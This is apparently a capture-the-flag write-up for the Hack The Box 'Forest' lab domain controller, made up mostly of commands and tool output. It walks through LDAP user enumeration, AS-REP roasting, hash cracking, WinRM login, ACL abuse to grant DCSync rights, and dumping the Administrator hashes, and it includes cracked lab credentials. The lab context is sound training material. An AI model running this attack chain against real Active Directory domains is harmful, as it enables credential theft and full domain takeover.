
### Initial access

Nmap
```
PORT      STATE SERVICE      REASON          VERSION
53/tcp    open  domain       syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-09-12 13:19:46Z)
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?    syn-ack ttl 127
593/tcp   open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack ttl 127
3268/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack ttl 127
5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       syn-ack ttl 127 .NET Message Framing
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49680/tcp open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49681/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49685/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49697/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49862/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows## IP/Name
### Initial access
### Lateral Movement
### Priv escalation
### Post exploit
```
Get user from ldap
```
nxc ldap 10.129.95.210 -u '' -p '' --users
LDAP        10.129.95.210   389    FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)
LDAP        10.129.95.210   389    FOREST           [+] htb.local\: 
LDAP        10.129.95.210   389    FOREST           [*] Enumerated 31 domain users: htb.local
LDAP        10.129.95.210   389    FOREST           -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.129.95.210   389    FOREST           Administrator                 2021-08-30 20:51:58 0        Built-in account for administering the computer/domain      
LDAP        10.129.95.210   389    FOREST           Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        10.129.95.210   389    FOREST           DefaultAccount                <never>             0        A user account managed by the system.                       
LDAP        10.129.95.210   389    FOREST           krbtgt                        2019-09-18 06:53:23 0        Key Distribution Center Service Account                     
LDAP        10.129.95.210   389    FOREST           $331000-VK4ADACQNUCA          <never>             0                                                                    
LDAP        10.129.95.210   389    FOREST           SM_2c8eef0a09b545acb          <never>             0                                                                    
LDAP        10.129.95.210   389    FOREST           SM_ca8c2ed5bdab4dc9b          <never>             0                                                                    
LDAP        10.129.95.210   389    FOREST           SM_75a538d3025e4db9a          <never>             0                                                                    
LDAP        10.129.95.210   389    FOREST           SM_681f53d4942840e18          <never>             0                                                                    
LDAP        10.129.95.210   389    FOREST           SM_1b41c9286325456bb          <never>             0                                                                    
LDAP        10.129.95.210   389    FOREST           SM_9b69f1b9d2cc45549          <never>             0                                                                    
LDAP        10.129.95.210   389    FOREST           SM_7c96b981967141ebb          <never>             0                                                                    
LDAP        10.129.95.210   389    FOREST           SM_c75ee099d0a64c91b          <never>             0                                                                    
LDAP        10.129.95.210   389    FOREST           SM_1ffab36a2f5f479cb          <never>             0                                                                    
LDAP        10.129.95.210   389    FOREST           HealthMailboxc3d7722          2019-09-23 18:51:31 0                                                                    
LDAP        10.129.95.210   389    FOREST           HealthMailboxfc9daad          2019-09-23 18:51:35 0                                                                    
LDAP        10.129.95.210   389    FOREST           HealthMailboxc0a90c9          2019-09-19 07:56:35 0                                                                    
LDAP        10.129.95.210   389    FOREST           HealthMailbox670628e          2019-09-19 07:56:45 0                                                                    
LDAP        10.129.95.210   389    FOREST           HealthMailbox968e74d          2019-09-19 07:56:56 0                                                                    
LDAP        10.129.95.210   389    FOREST           HealthMailbox6ded678          2019-09-19 07:57:06 0                                                                    
LDAP        10.129.95.210   389    FOREST           HealthMailbox83d6781          2019-09-19 07:57:17 0                                                                    
LDAP        10.129.95.210   389    FOREST           HealthMailboxfd87238          2019-09-19 07:57:27 0                                                                    
LDAP        10.129.95.210   389    FOREST           HealthMailboxb01ac64          2019-09-19 07:57:37 0                                                                    
LDAP        10.129.95.210   389    FOREST           HealthMailbox7108a4e          2019-09-19 07:57:48 0                                                                    
LDAP        10.129.95.210   389    FOREST           HealthMailbox0659cc1          2019-09-19 07:57:58 0                                                                    
LDAP        10.129.95.210   389    FOREST           sebastien                     2019-09-19 20:29:59 0                                                                    
LDAP        10.129.95.210   389    FOREST           lucinda                       2019-09-19 20:44:13 0                                                                    
LDAP        10.129.95.210   389    FOREST           svc-alfresco                  2026-09-12 09:29:45 0                                                                    
LDAP        10.129.95.210   389    FOREST           andy                          2019-09-22 18:44:16 0                                                                    
LDAP        10.129.95.210   389    FOREST           mark                          2019-09-20 18:57:30 0                                                                    
LDAP        10.129.95.210   389    FOREST           santi                         2019-09-20 19:02:55 0                                                                    


```
We AS-REP rosting to get cred

```
┌──(kali㉿kali)-[~/HTB/Forest]
└─$ impacket-GetNPUsers htb.local/ -no-pass -usersfile users.txt -dc-ip 10.129.95.210

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:5067e657bf0c9741d81956e4f8f10cf2$756ff693168c1f0bf07b3b45274bccc4937880e74954ef98f46335f58628b58189c15c526473511030a68e1949dc993594312d75c007a0f3b58c90beb7614b9cf1b01e0318802f3edfcdb60a1a4c53066d1b6ce45bce74e9185daf7c2cc9485bf3bf253a31ea22cf97bde3f0381cd924d162e62a3d10f0e52f52487169b190b325498d8162cce37556c205990e1daccd7ce68d84cfa5db8986800cfa11fc25302e759a48f90e3217be7bc09b956f1ee4de84e3086bb531469206efb8b559e9dd9db3aae3c63b8aa67f82ff1ed4bb40ed2560aa3fed096a5ab322e5fc571a5d618b92871dab33
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set

┌──(kali㉿kali)-[~/HTB/Forest]
└─$ cat users.txt 
Administrator
sebastien
lucinda
svc-alfresco
andy
mark
santi

```
We crack hash
```
┌──(kali㉿kali)-[~/HTB/Forest]
└─$ sudo hashcat -m 18200 asreproast.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force 
hashcat (v7.1.2) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #01: cpu-skylake-avx512-AMD Ryzen 7 8700G w/ Radeon 780M Graphics, 2901/5802 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 66

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory allocated for this attack: 514 MB (4225 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344388
* Bytes.....: 139921531
* Keyspace..: 946729608

$krb5asrep$23$svc-alfresco@HTB.LOCAL:5067e657bf0c9741d81956e4f8f10cf2$756ff693168c1f0bf07b3b45274bccc4937880e74954ef98f46335f58628b58189c15c526473511030a68e1949dc993594312d75c007a0f3b58c90beb7614b9cf1b01e0318802f3edfcdb60a1a4c53066d1b6ce45bce74e9185daf7c2cc9485bf3bf253a31ea22cf97bde3f0381cd924d162e62a3d10f0e52f52487169b190b325498d8162cce37556c205990e1daccd7ce68d84cfa5db8986800cfa11fc25302e759a48f90e3217be7bc09b956f1ee4de84e3086bb531469206efb8b559e9dd9db3aae3c63b8aa67f82ff1ed4bb40ed2560aa3fed096a5ab322e5fc571a5d618b92871dab33:s3rvice

```

Cred `svc-alfresco:s3rvice`

```
┌──(kali㉿kali)-[~/HTB/Forest]
└─$ nxc winrm  10.129.95.210  -u 'svc-alfresco' -p 's3rvice'          
WINRM       10.129.95.210   5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.95.210   5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)

```
Let connect usign win-rm
### Priv escalation
We read winpeas and have generic all in Domain Admins
```
ÉÍÍÍÍÍÍÍÍÍÍ¹ AD object control surfaces (T1484.001,T1087.002,T1018)
È Look for objects where you have GenericAll/GenericWrite/attribute rights for ACL abuse (password reset, SPN/UAC/RBCD, sidHistory, delegation, DCSync). https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html#acl-abuse                                                                                                                              
  [+] Found 108 object(s) where your principal has abuse-friendly rights:
    -> $331000-VK4ADACQNUCA (user)
       DN: CN=Exchange Online-ApplicationAccount,CN=Users,DC=htb,DC=local
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> $D31000-NSEL5BRJ63V7 (group)
       DN: CN=Exchange Install Domain Servers,CN=Microsoft Exchange System Objects,DC=htb,DC=local
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> Access Control Assistance Operators (group)
       DN: CN=Access Control Assistance Operators,CN=Builtin,DC=htb,DC=local
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> Account Operators (group)
       DN: CN=Account Operators,CN=Builtin,DC=htb,DC=local
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> Administrator (user)
       DN: CN=Administrator,CN=Users,DC=htb,DC=local
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> Administrators (group)
       DN: CN=Administrators,CN=Builtin,DC=htb,DC=local
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.
    -> AdminSDHolder (container)


 Domain Admins (group)
       DN: CN=Domain Admins,CN=Users,DC=htb,DC=local
       * GenericAll: Full control -> reset password, add group members, edit SPNs/UAC, change ACLs.

```

Upload powerview and add my user dcsync right , we have **AdminSDHolder**  that prevent us t change admin pass have to bypass it
```
*Evil-WinRM* PS C:\tmp> upload /home/kali/oscp/exploit-tool/powerview.ps1
                                        
Info: Uploading /home/kali/oscp/exploit-tool/powerview.ps1 to C:\tmp\powerview.ps1
                                        
Data: 1205588 bytes of 1205588 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\tmp> . ./powerview.ps1

*Evil-WinRM* PS C:\tmp> Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity "svc-alfresco" -Rights DCSync
*Evil-WinRM* PS C:\tmp> Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=htb,DC=local" -PrincipalIdentity "svc-alfresco" -Rights All
*Evil-WinRM* PS C:\tmp> Get-DomainObjectAcl -Identity "DC=htb,DC=local" -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -eq (Get-DomainUser svc-alfresco).objectsid} | fl

```


Running blood hound the attack path is svc-alfresco -> Operation Account -> Exchange Windows Permissions (Add current user  to this group) and perform dcsync to get admin hash. We need to create user to add to group cant user service user cuz lab have csript to dissamlow it

```
┌──(kali㉿kali)-[~/HTB/Forest]
└─$ bloodyad --host 10.129.95.210 -d htb.local -u svc-alfresco -p 's3rvice' add user hack123 'Password123!'

[+] hack123 created
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/HTB/Forest]
└─$ bloodyad --host 10.129.95.210 -d htb.local -u svc-alfresco -p 's3rvice' add groupMember 'Exchange Windows Permissions' hack123

[+] hack123 added to Exchange Windows Permissions
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/HTB/Forest]
└─$ bloodyad --host 10.129.95.210 -d htb.local -u hack123 -p 'Password123!' add dcsync hack123

[+] hack123 is now able to DCSync
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/HTB/Forest]
└─$ impacket-secretsdump htb.local/hack123:'Password123!'@10.129.95.210 -just-dc-user Administrator

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
[*] Cleaning up... 
                   
```